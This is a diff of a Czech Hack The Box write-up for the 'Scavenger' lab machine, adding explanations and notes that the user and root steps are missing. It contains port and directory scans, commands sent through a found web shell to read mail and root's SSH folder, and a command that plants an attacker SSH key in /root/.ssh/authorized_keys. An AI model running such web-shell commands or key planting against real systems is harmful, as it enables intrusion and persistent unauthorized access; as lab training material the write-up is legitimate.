@@ -5,11 +5,19 @@ title: "Scavenger"
 date: 2021-01-09
 tags: linux rce ssh php exploit enumeration
 ---
-[Scavenger](https://www.hackthebox.eu/home/machines/profile/202) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.
+
+## Úvod a kontext
+
+Scavenger je stroj z Hack The Box. Dochované podklady zachycují jen část postupu, proto níže ponechávám pouze technicky doložitelné kroky a chybějící části výslovně označuji k ověření.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
+```
 ```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
@@ -50,33 +58,70 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Vyhledání otevřených portů (2)
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -sU -T4 -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -sU -T4 -v $IP
+```
 ```
 => http://www.supersechosting.htb/
 ```
 
 ### Enumerace webu
-Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
-`./dirsearch.py -u http://sec03.rentahacker.htb/ -e php`
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+./dirsearch.py -u http://sec03.rentahacker.htb/ -e php
+```
 ```
 => sec03.rentahacker.htb/shell.php
 ```
 
+## Získání přístupu
+
 ### Spuštění exploitu
-Zde dochází k praktickému zneužití zranitelnosti.
-`view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/*`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```bash
+view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/*
+```
 
 ### Přihlášení na cíl
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;ls+-alh+/root/.ssh/"`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;ls+-alh+/root/.ssh/"
+```
 
 ### Přihlášení na cíl (2)
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;echo+\"ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8%2BQR3hnONfIO2Y%2FvhoVRgVDpeOUrpxa%2BEOnRNhAV9%2FdYNoi%__CENSORED__%2BzcpGO0MLPiuEl78INxwii7y94CAn1gl%__CENSORED__%2FptFIFGVukajnihbK%2Fb3uWCDtaJcgaSILoSomouxjfXqmAwj%2FTaM0qHsT7K9NZsPfOB5ZAXa2spPR%2BAGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl%__CENSORED__%2FtFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw%2BppfkBwBIs1Q%3D%3D+hack@t\"+>+/root/.ssh/authorized_keys"`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;echo+\"ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8%2BQR3hnONfIO2Y%2FvhoVRgVDpeOUrpxa%2BEOnRNhAV9%2FdYNoi%__CENSORED__%2BzcpGO0MLPiuEl78INxwii7y94CAn1gl%__CENSORED__%2FptFIFGVukajnihbK%2Fb3uWCDtaJcgaSILoSomouxjfXqmAwj%2FTaM0qHsT7K9NZsPfOB5ZAXa2spPR%2BAGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl%__CENSORED__%2FtFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw%2BppfkBwBIs1Q%3D%3D+hack@t\"+>+/root/.ssh/authorized_keys"
+```
 
 ### Získání user flagu
-`TODO`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+
+[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro získání uživatelského přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]
+
+## Eskalace oprávnění
 
 ### Získání root flagu
-`TODO`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+
+[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro eskalaci oprávnění a získání root přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]
+
+## Shrnutí klíčových poznatků
+
+- Dochované podklady zachycují jen část postupu, proto jsou místa bez opory ve zdrojovém textu označena ověřovací poznámkou místo domněnek.
+- Záměrně nedoplňuji neověřené detaily o exploitu, kredenciálech ani eskalaci; publikovatelná verze musí stát jen na dohledatelných krocích.
+- Chybějící mezikroky mezi enumerací, potvrzením přístupu a finální eskalací zůstávají explicitně otevřené k doplnění z ověřených podkladů.
+
+## Co si odnést do praxe
+
+- Pro publikovatelný HTB write-up je nutné uložit i mezikroky mezi enumerací, hypotézou a potvrzením přístupu; samotné placeholdery nestačí.
+- Pokud chybí výstupy nebo přesná argumentace, je lepší explicitně přiznat nejistotu než doplňovat neověřené technické detaily.
+- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
